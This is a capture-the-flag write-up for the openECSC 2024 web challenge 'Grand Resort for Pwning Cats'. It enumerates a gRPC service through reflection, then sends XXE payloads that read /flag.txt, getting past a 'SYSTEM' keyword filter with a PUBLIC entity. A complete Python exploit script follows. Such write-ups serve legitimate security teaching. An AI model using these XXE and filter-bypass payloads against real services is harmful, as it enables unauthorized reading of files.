# openECSC 2024 - Round 3

## [web] Grand Resort for Pwning Cats (178 solves)

Welcome to the Grand Resort for Pwning Cats. Are you ready to become the cutest pwner kitten at our establishment?

The flag is stored in `/flag.txt`

Site: [http://grandresort.challs.open.ecsc2024.it](http://grandresort.challs.open.ecsc2024.it)

Authors: Vittorio Mignini <@M1gnus>, Simone Cimarelli <@Aquilairreale>

## Foothold

Since no proto files or service description are provided, the only way to make requests to the server is by using GRPC Reflection. GRPC Reflection allow a client to know what services are hosted by the server and to know details about methods and messages.

The GO code which enable GRPC reflection is the following, from `server.go`:

```golang
reflection.Register(grpcServer)
```

Since reflection is enabled, the first thing to do is use a proper tool to enumerate services and methods. In this writeup there will be two solution, using `grpc_cli` and python's library `grpc_requests`.

## Enumerate services

```text
~ % grpc_cli ls 192.168.1.143:55001
GrandResort.Reception
grpc.reflection.v1.ServerReflection
grpc.reflection.v1alpha.ServerReflection
```

The only service non reflection-related is `GrandResort.Reception`, which has to be the correct one to further enumerate.

## Enumerate service methods

```text
~ % grpc_cli ls 192.168.1.143:55001 -l
filename: grand-resort.proto
package: GrandResort;
service Reception {
  rpc createRoomRequestModelc21a7f50(google.protobuf.Empty) returns (GrandResort.RoomRequestModel) {}
  rpc createRoom73950029(GrandResort.RoomRequestModel) returns (GrandResort.RoomCreationResponse) {}
  rpc listRooms(google.protobuf.Empty) returns (GrandResort.RoomList) {}
  rpc bookRoom(GrandResort.BookingInfo) returns (GrandResort.BookingConfirm) {}
}

filename: grpc/reflection/v1/reflection.proto
package: grpc.reflection.v1;
service ServerReflection {
  rpc ServerReflectionInfo(stream grpc.reflection.v1.ServerReflectionRequest) returns (stream grpc.reflection.v1.ServerReflectionResponse) {}
}

filename: grpc/reflection/v1alpha/reflection.proto
package: grpc.reflection.v1alpha;
service ServerReflection {
  rpc ServerReflectionInfo(stream grpc.reflection.v1alpha.ServerReflectionRequest) returns (stream grpc.reflection.v1alpha.ServerReflectionResponse) {}
}
```

The most interesting methods is the one called `createRoomRequestModelc21a7f50` and the one called `createRoom73950029`. The only argument taken by `createRoomRequestModelc21a7f50` is `google.protobuf.Empty`, which is represented by an empty string in `grpc_cli`, while the only argument taken by `createRoom73950029` is `GrandResort.RoomRequestModel`.

## Call the interesting RPC procedures

```xml
~ % grpc_cli call 192.168.1.143:55001 createRoomRequestModelc21a7f50 "" --json_output 2>/dev/null | jq -r .RoomRequestModel
<?xml version="1.0" encoding="UTF-8"?>
<room>
    <name>RoomName</name>
    <price>$100.0</price>
    <description>RoomDescription</description>
    <size>30 m2</size>
</room>
```

The obtained model can be used to perform a XXE attack, to read the file `/flag.txt`.

```xml
~ % grpc_cli type 192.168.1.143:55001 GrandResort.RoomRequestModel
message RoomRequestModel {
  string RoomRequestModel = 1 [json_name = "RoomRequestModel"];
}
~ % grpc_cli --json_input call 192.168.1.143:55001 createRoom73950029 '{"RoomRequestModel": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE room [<!ENTITY flag SYSTEM \"/flag.txt\">]>
<room>
  <name>&flag;</name>
  <price>$100.0</price>
  <description>RoomDescription</description>
  <size>30 m2</size>
</room>"}'
connecting to 192.168.1.143:55001
RoomCreationResponse: "Error: you can\'t use the S-word!"
```

From the response we can deduce that "SYSTEM" keyword is filtered, easy as it is: we can use PUBLIC instead:

```xml
grpc_cli --json_input call 192.168.1.143:55001 createRoom73950029 '{"RoomRequestModel": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE room [<!ENTITY flag PUBLIC \"flag\" \"/flag.txt\">]>
<room>
  <name>&flag;</name>
  <price>$100.0</price>
  <description>RoomDescription</description>
  <size>30 m2</size>
</room>"}'
connecting to 192.168.1.143:55001
RoomCreationResponse: "You requested the creation of openECSC{UWu_r3fl3ktIng_K17T3n5_uWU_c3c3c181}"
```

## Exploit

> grpc_requests==0.1.16

```python
import os
from grpc_requests import Client
from textwrap import dedent

HOST = os.environ.get("HOST", "grandresort.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38010))

client = Client.get_by_endpoint(f"{HOST}:{PORT}")

print("##### OBTAINING SERVICES #####")
for service in client.service_names:
  print(f"SERVICE: {service}")
service = client.service("GrandResort.Reception")
print()

print("##### OBTAINING SERVICE METHODS #####")
for method in service.method_names:
  print(f"METHOD: {method}")
getTemplate = getattr(service, "createRoomRequestModelc21a7f50")
sendRequest = getattr(service, "createRoom73950029")
print()

print("##### DESCRIBE METHOD REQUEST #####")
print(f'PARAMETERS GET TEMPLATE: {client.describe_method_request("GrandResort.Reception", "createRoomRequestModelc21a7f50")}')
print(f'PARAMETERS SEND REQUEST: {client.describe_method_request("GrandResort.Reception", "createRoom73950029")}')
print()

print("##### GET THE TEMPLATE #####")
print(getTemplate({})["RoomRequestModel"])
print()

print("##### EXECUTING THE XXE #####")
print(sendRequest({
  "RoomRequestModel": dedent("""
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE room [<!ENTITY flag PUBLIC "flag" "/flag.txt">]>
    <room>
        <name>&flag;</name>
        <price>$100.0</price>
        <description>RoomDescription</description>
        <size>30 m2</size>
    </room>
  """).strip()
})['RoomCreationResponse'])
```
